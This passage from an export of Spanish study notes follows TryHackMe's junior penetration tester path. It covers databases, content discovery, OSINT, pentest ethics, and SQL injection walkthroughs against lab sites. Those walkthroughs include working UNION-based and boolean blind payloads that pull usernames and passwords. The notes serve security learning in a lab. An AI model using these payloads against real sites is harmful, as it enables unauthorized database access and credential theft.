    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/2. What is a Database.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "Si no est√°s habituado a trabajar con bases de datos o explotarlas, aqu√≠ tienes alguna tecnolog√≠a con la que familiarizarte.\n\n---------------------------\n<h2>¬øQu√© es una Base de Datos?</h2>\nUna base de datos es un modo electr√≥nico de guardar recopilaciones de informaci√≥n de manera organizada. Una base de datos es gestionada por un DBMS, que es un acr√≥nimo de Database Management System. Estas se dividen en dos tipos: Relacionales y No Relacionales. El enfoque de esta unidad ser√° en las relacionales. Algunas comunes son MySQL, Microsoft SQL Server, Access, PostgreSQL y SQLite.\n\nEn un DBMS puedes tener varias bases de datos, cada una con si conjunto de informaci√≥n relacionada. Por ejemplo, podr√≠as tener una base de datos llamada \"**tienda**\". Dentro de ella querr√°s guardar informaci√≥n sobre los **productos** disponibles para comprar, **usuarios** que se hayan registrado e informaci√≥n sobre los **pedidos**. Almacenar√≠as esta informaci√≥n en la base de datos usando una estructura llamada \"tabla\". Cada una se identifica con un nombre √∫nico.\n\n![[Pasted image 20251113202512.png]]\n\n-----------------------------------\n<h2>¬øQu√© son las Tablas?</h2>\nUna tabla est√° hecha de columnas y filas. Una manera √∫til de imaginarse una tabla es como una red en la que las columnas van de arriba a abajo y las filas de izquierda a derecha.\n\n![[Pasted image 20251113202650.png]]\n\n<h5>Columnas</h5>\nCada columna tiene un nombre √∫nico por tabla. Al crear una columna, puedes tambi√©n configurar el tipo de informaci√≥n que contendr√°. Algunos tipos comunes son **INT** (n√∫meros enteros), **VARCHAR** (cadenas de texto/n√∫meros) o **DATE** (fechas). Esta acci√≥n de especificar el tipo de dato previene que no se guarde informaci√≥n en un sitio que no corresponde. Una columna que contiene un INT tambi√©n puede tener un atributo que la haga **AUTO_INCREMENT**ar. Esto da lugar a una **PK** (Primary Key o Clave Primaria), que es el campo √∫nico por entrada que identifica a cada elemento de la tabla tanto dentro de ella como fuera.\n\n<h5>Filas</h5>\nLas filas, o registros, contienen la informaci√≥n. Cuando a√±ades informaci√≥n a la tabla, se crea una nueva fila y cuando la quitas se elimina.\n\n------------------------------------\n<h2>Bases de Datos Relacionales vs No Relacionales</h2>\nUna base de datos relacional guarda informaci√≥n en tablas, normalmente estas comparten informaci√≥n entre ellas. Usan columnas para especificar y definir la informaci√≥n que se guarda. Las tablas contendr√°n una columna que sea un ID √∫nico (PK) que ser√° usada para referenciar esta tabla y sus componentes desde otra o desde queries SQL.\n\nLas bases de datos no relacionales, a veces llamadas NoSQL, por otro lado, son cualquier tipo de base de datos que no use tablas, columnas y filas para guardar la informaci√≥n. Dan m√°s flexibilidad con respecto a las relacionales porque se puede guardar cualquier tipo de informaci√≥n. Algunas bases de datos populares en esta categor√≠a son MongoDB, Cassandra y ElasticSearch.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. SQL Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/0-sql-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/0. SQL Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/1. Brief]]\n[[2. What is a Database]]\n[[3. What is SQL]]\n[[4. What is SQL Injection]]\n[[5. In-Band SQLI]]\n[[6. Blind SQLI - Authentication Bypass]]\n[[7. Blind SQLI - Boolean Based]]\n[[8. Blind SQLI - Time Based]]\n[[9. Out-of-Band SQLI]]\n[[10. Remediation]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. In-Band SQLI",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/5-in-band-sqli/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/5. In-Band SQLI.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "La SQLi In-Band es el tipo m√°s f√°cil de detectar y explotar. Se refiere al mismo m√©todo de comunicaci√≥n para explotar la vulnerabilidad y recibir los resultados, por ejemplo, descubrir una vulnerabilidad de inyecci√≥n SQL en un sitio web y ser capaz de extraer informaci√≥n de la base de datos en la propia p√°gina.\n\n---------------------------\n<h2>SQLi Basada en Errores</h2>\nEste tipo es la m√°s √∫til para obtener informaci√≥n sobre la estructura de la base de datos, ya que los errores de la base de datos se imprimen en el navegador directamente. Puede ser usado para enumerar una base de datos entera.\n\nLa clave para descubrirlas es romper el c√≥digo SQL probando caracteres especiales hasta que salga un mensaje de error. Normalmente se hace con `'` o `\"`.\n\n-------------------------------------\n<h2>SQLi Basada en Uni√≥n</h2>\nEste tipo de inyecci√≥n usa el operador SQL \"UNION\" junto a SELECT para devolver resultados adicionales a la p√°gina. Este m√©todo es la forma m√°s com√∫n de extraer grandes cantidades de informaci√≥n v√≠a SQLi.\n\n----------------------------------\n<h2>Pr√°ctica</h2>\nVamos a ver algunos ejemplos pr√°cticos.\n\n-------------------------------\n<h2>Nivel 1</h2>\n\n![[Pasted image 20251114100228.png]]\n\nProbamos a meter una comilla simple. Esto nos devuelve un error:\n\n![[Pasted image 20251114100410.png]]\n\nEsto deja constancia de que hay una vulnerabilidad SQLi y ahora toca explotarla. Intentaremos que nos devuelva informaci√≥n usando el operador UNION: `1 UNION SELECT 1`\n\n![[Pasted image 20251114100748.png]]\n\nA√±adimos otra columna:\n\n![[Pasted image 20251114100828.png]]\n\nY as√≠ hasta que acertemos:\n\n![[Pasted image 20251114100950.png]]\n\nLa query nos devuelve el art√≠culo porque es lo primero con lo que se encuentra (`id=1`), pero si modificamos la query para que muestre un art√≠culo que no existe (`id=0`) entonces nos mostrar√° nuestra informaci√≥n.\n\n![[Pasted image 20251114101443.png]]\n\nPodemos ver que el 1, el 2 y el 3 aparecen en el resultado. Si cambiamos alguno de esos n√∫meros por un t√©rmino existente nos devolver√° ese t√©rmino en el sitio que le corresponde, por ejemplo el 3: `https://website.thm/article?id=0 UNION SELECT 1,2,database()`\n\n![[Pasted image 20251114101607.png]]\n\nAhora que sabemos el nombre de la base de datos (**sqli_one**), toca obtener el nombre de las tablas. Para ello vamos a usar la siguiente query: `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`\n\n![[Pasted image 20251114101909.png]]\n\n>[!TIP] Si no entiendes las sentencias revisa [[0. SQL Fundamentals]] y estudia SQL, es la mejor manera de entenderlo todo.\n\nComo nos interesa descubrir la contrase√±a de Martin vamos a buscar en **staff_users** que significa usuarios del equipo.\n\nVolvemos a utilizar **information_schema** pero ahora con **columns** y en group_concat() metemos **column_name** en lugar de **table_name**.\n\n`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`\n\n![[Pasted image 20251114102247.png]]\n\nAhora toca obtener los datos que nos interesan:\n\n`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`\n\n![[Pasted image 20251114102519.png]]\n\nHabiendo obtenido la contrase√±a de Martin nos movemos hacia el siguiente nivel y obtenemos la flag.\n\n![[Pasted image 20251114102643.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Blind SQLI - Boolean Based",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/11-sql-injection/7-blind-sqli-boolean-based/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/11. SQL Injection/7. Blind SQLI - Boolean Based.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 11. SQL Injection",
    "content": "Las SQLi basadas en booleanos se refiere a la respuesta que recibimos de nuestros intentos de inyecci√≥n, que podr√≠an volver como true/false, 1/0, o cualquier output binario. Parece que con una respuesta tan limitada no podemos hacer nada, sin embargo, podemos enumerar la base de datos entera.\n\n----------------------\n<h2>Pr√°ctica</h2>\nVamos a ver algunos ejemplos pr√°cticos.\n\n--------------------------------------\n<h2>Nivel 3</h2>\n![[Pasted image 20251114114104.png]]\n\nEn este nivel nos encontramos con un enlace: `https://website.thm/checkuser?username=admin`. Al que responde una API con **{\"taken\":true}**. Esto es un comportamiento bastante habitual que lo que hace comprobar si un usuario ya est√° registrado. Si cambiamos el usuario a **admin123** veremos que se pone en false.\n\n![[Pasted image 20251114114130.png]]\n\nLa query que se procesa se ve as√≠:\n\n`SELECT * FROM users WHERE username='%username%' LIMIT 1;\n\nLo √∫nico que podemos controlar es el input de username. Manteniendo **admin123**, podemos  empezar a a√±adir sentencias para hacer que la base de datos confirme cosas verdaderas.\n\nPrimero debemos de establecer el n√∫mero de columnas:\n\n![[Pasted image 20251114120757.png]]\n\nAl acertar el n√∫mero de columnas cambia de false a true. Al saber el n√∫mero de columnas, podemos empezar a listar la base de datos. Solo que ahora debemos basarnos en las respuestas por lo que implementaremos `LIKE '%'`. Esto devolver√° true o false y despu√©s vamos probando diferentes letras.\n\n![[Pasted image 20251114121036.png]]\n\n![[Pasted image 20251114121053.png]]\n\nAhora sabemos que la base de datos no empieza por \"a\", por lo que seguimos probando. Si vamos probando llegaremos a que `'s%'` devuelve `true`. Por lo que seguimos con `'sa%'`, `'sb%'`, etc. Si seguimos llegaremos a que la base de datos es `sqli_three`\n\nPor lo que ahora debemos hacer lo de las tablas de antes pero implementando `LIKE '%'` otra vez:\n\n`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--`\n\nSi seguimos descubriremos que la tabla es `users`. Hacemos lo mismo para las columnas:\n\n`admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`\n\nCon la √∫nica diferencia que para encontrar todas las columnas debemos a√±adir al condici√≥n de '`COLUMN_NAME != 'columna_encontada'`.\n\nSi seguimos descubriremos que hay una columna llamada username, de donde podemos confirmar si alg√∫n usuario 'admin' existe: `admin123' UNION SELECT 1,2,3 from users where username like 'a%`\n\nUna vez confirmado nos podemos centrar en la extracci√≥n de la contrase√±a:\n\n`admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%`\n\nDe esta manera descubriremos que la contrase√±a es `3845`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. OSINT - Wayback Machine",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/9-osint-wayback-machine/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/9. OSINT - Wayback Machine.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>M√°quina Wayback</h2>\nLa [Wayback Machine](https://archive.org/web/) es un archivo hist√≥rico que data de finales de los a√±os 90 activo hasta hoy en d√≠a (2025). Puedes buscar un dominio y te mostrar√° las snapshots que tiene. Puede ayudar a descubrir p√°ginas antiguas que sigan activas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. OSINT - Wappalyzer",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/8-osint-wappalyzer/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/8. OSINT - Wappalyzer.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>Wappalyzer</h2>\n[Wappalyzer](https://www.wappalyzer.com/) es una herramienta y extensi√≥n de navegador que ayuda a identificar qu√© tecnolog√≠as usa un sitio web, como frameworks, CMS (Content Management Systems), procesadores de pagos y mucho m√°s.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Manual Discovery - Sitemap xml",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/4-manual-discovery-sitemap-xml/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/4. Manual Discovery - Sitemap xml.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>Sitemap.xml</h2>\nAl contrario que el archivo `robots.txt`, que restringe lo que el motor de b√∫squeda puede ver, el archivo `sitemap.xml` muestra una lista de todos los archivos que el due√±o del sitio web quiere listar en el motor de b√∫squeda. Estos pueden contener versiones antiguas de la p√°gina que sigan en funcionamiento o p√°ginas a las que sea m√°s dif√≠cil navegar, etc.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Manual Discovery - Robots txt",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/2-manual-discovery-robots-txt/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/2. Manual Discovery - Robots txt.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "Hay muchos lugares que podemos mirar manualmente en una web para empezar a descubrir contenido.\n\n<h2>Robots.txt</h2>\nEl archivo `robots.txt` es un documento que le dice al motor de b√∫squeda qu√© p√°ginas tiene permitido mostrar y cu√°les no. Es una pr√°ctica com√∫n restringir ciertas √°reas para que no se muestren en los buscadores. Este archivo nos da una buena lista de rutas en la p√°gina web que los due√±os no quieren que descubramos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. OSINT - Google Hacking - Dorking",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/7-osint-google-hacking-dorking/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/7. OSINT - Google Hacking - Dorking.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "Tambi√©n hay recursos externos disponibles que pueden ayudarte  en el descubrimiento de informaci√≥n sobre tu p√°gina objetivo. Estos recursos se conocen como OSINT (Open-Source Inteligence) ya que son accesibles gratuitamente por todo el mundo.\n\n----------------------------------\n<h2>Google Hacking / Dorking</h2>\nEl google hacking quiere decir usar funcionalidades avanzadas del motor de b√∫squeda que te permiten obtener resultados personalizados. Puedes, por ejemplo, obtener resultados de un cierto dominio usando el filtro \"**site:**\". Tmbi√©n puedes combinar m√°s de un filtro, aqu√≠ una tabla con algunos filtros:\n\n| **Filtro** | **Ejemplo**        | **Descripci√≥n**                                                  |\n| ---------- | ------------------ | ---------------------------------------------------------------- |\n| site       | site:tryhackme.com | Devuelve resultados s√≥lo de la web especificada.                 |\n| inurl      | inurl:admin        | S√≥lo devuelve resultados que tengan lo especificado en la URL.   |\n| filetype   | filetype:pdf       | Devuelve s√≥lo resultados que tengan una extensi√≥n en particular. |\n| intitle    | intitle:admin      | Devuelve resultados que tengan lo especificado en el t√≠tulo.     |\n[Aqu√≠](https://en.wikipedia.org/wiki/Google_hacking) tienes m√°s informaci√≥n sobre Google Hacking.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "12. Automated Discovery",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/12-automated-discovery/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/12. Automated Discovery.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>¬øQu√© es el Descubrimiento Automatizado</h2>\nEl descubrimiento automatizado es el proceso de usar herramientas para descubrir contenido en lugar de buscarlo a mano. Est√° automatizado, ya que involucra cientos, miles o incluso millones de peticiones a un servidor web. Estas nos dicen si un recurso existe en la p√°gina.\n\n-------------------------------\n<h2>¬øQu√© son los diccionarios?</h2>\nLos diccionarios son simplemente archivos de texto que contienen una larga lista de palabras com√∫nmente usadas. El diccionario empleado depender√° espec√≠ficamente del tipo de informaci√≥n que estemos buscando (contrase√±as, usuarios, contenido, etc.). Un repositorio con una de las mejores listas de diccionarios es la de [SecLists](https://github.com/danielmiessler/SecLists) de Daniel Miessler.\n\n-------------------------------------\n<h2>Herramienta de Automatizaci√≥n</h2>\nAunque hay muchas herramientas de descubrimiento de contenido disponibles, vamos a cubrir las tres siguientes: `ffuf`, `dirb` y `gobuster`.\n\n- **ffuf:**\n\n```bash\nuser@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ\n```\n\n- **dirb:** \n\n```bash\nuser@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n```\n\n- **gobuster:** \n\n```bash\nuser@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Manual Discovery - Framework Stack",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/6-manual-discovery-framework-stack/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/6. Manual Discovery - Framework Stack.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>Stack del Framework</h2>\nUna vez establecido el framework del sitio, ya sea por el favicon o mirando pistas en el c√≥digo fuente para localizar la p√°gina del framework de la web. Desde ah√≠, podemos aprender m√°s sobre el software y otra informaci√≥n, posiblemente llevando a m√°s contenido que poder descubrir.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Manual Discovery - Favicon",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/3-manual-discovery-favicon/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/3. Manual Discovery - Favicon.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>Favicon</h2>\nEl favicon es el peque√±o icono mostrado en la barra de direcci√≥n del navegador. A veces, si como parte de la instalaci√≥n el favicon se queda de resto y el desarrollador no lo cambia por uno propio, esto puede darnos pistas del framework usado. OWASP hostea una base de datos de iconos de  frameworks comunes que puedes usar para comprobar el favicon pinchando [aqu√≠](https://wiki.owasp.org/index.php/OWASP_favicon_database). Una vez que conocemos el stack del framework podemos usar herramientas externas para obtener m√°s informaci√≥n.\n\n-------------------\n<h2>Ejercicio Pr√°ctico</h2>\n1. Entramos en la web que nos dan.\n   ![[Pasted image 20251103232536.png]]\n2. En el c√≥digo fuente podemos ver un enlace al favicon.\n   ![[Pasted image 20251103232724.png]]\n3. Extraemos el md5 del favicon para compararlo con la base de datos del OWASP.\n   ![[Pasted image 20251103232935.png]]\n4. Encontramos el framework usado.\n   ![[Pasted image 20251103233753.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. OSINT - S3 Buckets",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/11-osint-s3-buckets/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/11. OSINT - S3 Buckets.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>S3 Buckets</h2>\nLos S3 Buckets son un servicio de almacenamiento ofrecido por Amazon AWS, permitiendo a la gente guardar archivos y contenido web est√°tico en la nube, accesible por HTTP/S. El due√±o de los arcchivos puede configurar permisos de acceso para hacer los archivos privados, p√∫blicos o incluso escribible. El formato de los S3 Buckets es: **http(s)://{nombre}.s3.amazonaws.com** donde el nombre es decidido por el due√±o. Un procedimiento est√°ndar es usar el nombre de la compa√±√≠a seguido de t√©rminos comunes como **{nombre}-assests**, **{nombre}-www**, **{nombre}-public**, **{nombre}-private**, etc.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. OSINT - GitHub",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/10-osint-github/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/10. OSINT - GitHub.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>GitHub</h2>\nPara comprender GitHub, necesitamos entender Git primero. Git es un sistema de control de versiones que guarda los cambios de los archivos de un proyecto. Trabajar en un equipo es m√°s f√°cil porque puedes ver lo que est√° editando cada miembro y los cambios que han hecho en los archivos. Cuando los usuarios han terminado de hacer cambios, hacen un commit, con un comentario y luego un push para subir esos cambios a un repositorio para que otros usuarios puedan pullearlos en sus propias m√°quinas. GitHub es una versi√≥n de Git hosteada en internet.Los repositorios pueden ser p√∫blicos o privados. Puedes usar el buscador de github para buscar por compa√±√≠as o dominios.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Manual Discovery - HTTP Headers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/5-manual-discovery-http-headers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/5. Manual Discovery - HTTP Headers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "<h2>Headers HTTP</h2>\nCuando hacemos una petici√≥n al servidor web, el servidor devuelve varios headers HTTP. Estos headers pueden contener a veces informaci√≥n √∫til como el software del servidor web y el lenguaje de programaci√≥n en uso. En el ejemplo de abajo podemos ver que es un webserver NGINX versi√≥n 1.18.0 y corre PHP en versi√≥n 7.4.3. Usando esta informaci√≥n, podr√≠amos encontrar vulnerabilidades del software usado.\n\n```shell\nuser@machine$ curl http://10.10.235.145 -v \n*   Trying 10.10.235.145:80... \n* TCP_NODELAY set \n* Connected to 10.10.235.145 (10.10.235.145) port 80 (#0) \n> GET / HTTP/1.1 \n> Host: 10.10.235.145 \n> User-Agent: curl/7.68.0 \n> Accept: */* \n>  \n* Mark bundle as not supporting multiuse \n< HTTP/1.1 200 OK \n< Server: nginx/1.18.0 (Ubuntu) \n< X-Powered-By: PHP/7.4.3 \n< Date: Mon, 19 Jul 2021 14:39:09 GMT \n< Content-Type: text/html; charset=UTF-8 \n< Transfer-Encoding: chunked \n< Connection: keep-alive\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Content Discovery",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/0-content-discovery/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/0. Content Discovery.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "[[1. What Is Content Discovery]]\n[[2. Manual Discovery - Robots txt]]\n[[3. Manual Discovery - Favicon]]\n[[4. Manual Discovery - Sitemap xml]]\n[[5. Manual Discovery - HTTP Headers]]\n[[6. Manual Discovery - Framework Stack]]\n[[7. OSINT - Google Hacking - Dorking]]\n[[8. OSINT - Wappalyzer]]\n[[9. OSINT - Wayback Machine]]\n[[10. OSINT - GitHub]]\n[[11. OSINT - S3 Buckets]]\n[[12. Automated Discovery]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What Is Content Discovery",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/2-content-discovery/1-what-is-content-discovery/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/2. Content Discovery/1. What Is Content Discovery.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 2. Content Discovery",
    "content": "Primero deber√≠amos preguntarnos, en concepto de aplicaci√≥n web, ¬øqu√© es el contenido? Puede ser muchas cosas, un archivo, un v√≠deo, una imagen, un backup, etc. Cuando hablamos de descubrimiento de contenido no estamos hablando de  las cosas obvias que podemos ver en la web, sino las que no se presentan inmediatamente al p√∫blico.\n\nEste contenido podr√≠an ser, por ejemplo, p√°ginas o portales para uso del personal, versiones antiguas, archivos de backup, configuraci√≥n, etc. Hay tres maneras principales: manualmente, autom√°ticamente y mediante OSINT.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Penetration Testing Ethics",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/2-penetration-testing-ethics/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/2. Penetration Testing Ethics.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": "La batalla legal y √©tica en ciberseguridad es controversial. Etiquetas como hacking, o hacker pueden ser asumidas con connotaciones negativas, especialmente en la cultura pop, gracias a ciertas personas.\n\nRecuerda que un pentest es una auditor√≠a autorizada de un sistema computacional y sus sistemas de seguridad y defensa. Esto se realiza mediante un acuerdo entre la parte auditada y la parte auditora. Cualquier t√©rmino que caiga fuera de este se considera no autorizado. El alcance legal se conoce como **scope**. El debate es puramente √©tico, pues aunque una acci√≥n sea legal igual no es √©tica.\n\nLos hackers se dividen en tres categor√≠as, que se conocen como sombreros: blanco, gris y negro.\n\n| **Categor√≠a de Sombrero** | **Descripci√≥n**                                                                                                                | **Ejemplo**                                                                           |\n| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- |\n| White Hat                 | Se consideran buenas personas. Se mantienen dentro del marco legal y utilizan sus habilidades para beneficiar a otros.         | Un pentester realizando un escaneo autorizado a una compa√±√≠a.                         |\n| Grey Hat                  | Usan sus habilidades para beneficiar a otros a menudo. Sin embargo no siempre se rigen por los l√≠mites legales o √©ticos.       | Alguien tumbando un sitio web fraudulento o de estafas.                               |\n| Black Hat                 | Son criminales y suelen buscar da√±ar a organizaciones o ganar beneficio econ√≥mico a costa de otro. O simplemente hacer el mal. | Autores de un ataque de ransomware piden rescate por la informaci√≥n que secuestraron. |\n\n----------------------------------------\n<h2>Reglas del Escaneo (ROE)</h2>\nEs el documento que se crea en la fase inicial del pentesting. Consiste de tres secciones. El instituto SANS tiene un ejemplo del documento que puedes ver [aqu√≠](https://sansorg.egnyte.com/dl/bF4I3yCcnt/?) o en la siguiente p√°gina.\n\n| **Secci√≥n** | **Descripci√≥n**                                                                                                                                 |\n| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |\n| Permiso     | Esta secci√≥n del documento da permiso expl√≠cito para llevar a cabo el test. Es esencial para protegerse de cualquier problema legal resultante. |\n| Alcance     | Detallar√° objetivos espec√≠ficos.                                                                                                                |\n| Reglas      | Definir√° exactamente las t√©cnicas permitidas durante el test.                                                                                   |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is Penetration Testing",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/1-what-is-penetration-testing/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/1. What is Penetration Testing.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
